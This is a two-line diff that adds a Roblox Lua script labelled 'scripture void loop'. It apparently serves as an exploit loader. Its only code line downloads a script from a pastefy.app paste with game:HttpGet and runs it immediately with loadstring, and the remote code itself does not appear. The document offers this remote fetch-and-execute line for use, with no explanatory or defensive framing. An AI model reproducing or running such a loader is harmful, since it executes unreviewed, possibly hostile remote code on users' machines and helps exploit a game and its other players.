@@ -1,0 +1,2 @@
+-- scripture void loop
+loadstring(game:HttpGet("https://pastefy.app/qVqF0Zh2/raw"))()
